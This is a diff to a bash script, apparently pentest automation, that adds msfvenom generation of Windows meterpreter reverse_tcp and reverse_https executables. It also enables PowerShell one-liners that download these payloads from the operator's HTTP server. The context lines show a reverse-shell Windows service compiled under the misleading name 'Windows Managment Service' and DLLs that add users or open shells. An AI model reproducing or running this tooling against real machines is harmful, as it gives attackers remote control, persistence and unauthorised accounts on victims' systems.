@@ -6,8 +6,9 @@ lport=4444
 
 usage() {
     echo "Usage:"
-    echo "-c    -> compile binaries and list"
-    echo "-d    -> only compile binaries"
+    echo "-c    -> compile basic binaries"
+    echo "-m    -> compile meterpreter binaries"
+    echo "-d    -> compile all binaries but don't list"
     echo "-g    -> generate powershell one liners"
     echo "-s    -> don't start python http server"
     echo "-h    -> help menu"
@@ -40,8 +41,14 @@ set_payloads() {
 
     x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/src/rs_service/main.c /home/$USER/auto/payloads/src/rs_service/service.c /home/$USER/auto/payloads/src/rs_service/shell.c -o /home/$USER/auto/payloads/rs_service.exe \
     -DSERVER_HOST=L"\"$lhost\"" -DSERVER_PORT=L"\"$lport\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
+
+    
 }
 
+make_meterpreter() {
+    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/mettcp.exe
+    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > /home/$USER/auto/payloads/methttps.exe
+}
 
 # prints the list
 list_stuff() {
@@ -108,8 +115,8 @@ list_stuff() {
     echo ""
     echo "iwr -uri http://$lhost/payloads/rs_service.exe -OutFile rs_service.exe"
     echo ""
-    echo "iwr -uri http://$lhost/payloads/mettcp.exe -OutFile mettcp.exe     (TODO)"
-    echo "iwr -uri http://$lhost/payloads/methttps.exe -OutFile methttps.exe (TODO)"
+    echo "iwr -uri http://$lhost/payloads/mettcp.exe -OutFile mettcp.exe"
+    echo "iwr -uri http://$lhost/payloads/methttps.exe -OutFile methttps.exe"
     echo ""
     echo "iwr -uri http://$lhost/payloads/cppdll_useradd.dll -OutFile cppdll_useradd.dll"
     echo "iwr -uri http://$lhost/payloads/cppdll_shell.dll -OutFile cppdll_shell.dll"
@@ -153,15 +160,19 @@ start_http_server() {
 
 custom_lhost=false
 compile=false
+meterpreter=false
 genshells=false
 start_python=true
 compile_and_dontlist=false
 
 # Parse arguments
-while getopts ":cdgsi:p:" opt; do
+while getopts ":cmdgsi:p:" opt; do
     case ${opt} in
     c )
         compile=true
+        ;;
+    m )
+        meterpreter=true
         ;;
     d )
         compile_and_dontlist=true
@@ -193,6 +204,10 @@ fi
 
 if $compile; then
     set_payloads
+fi
+
+if $meterpreter; then
+    make_meterpreter
 fi
 
 if $compile_and_dontlist; then
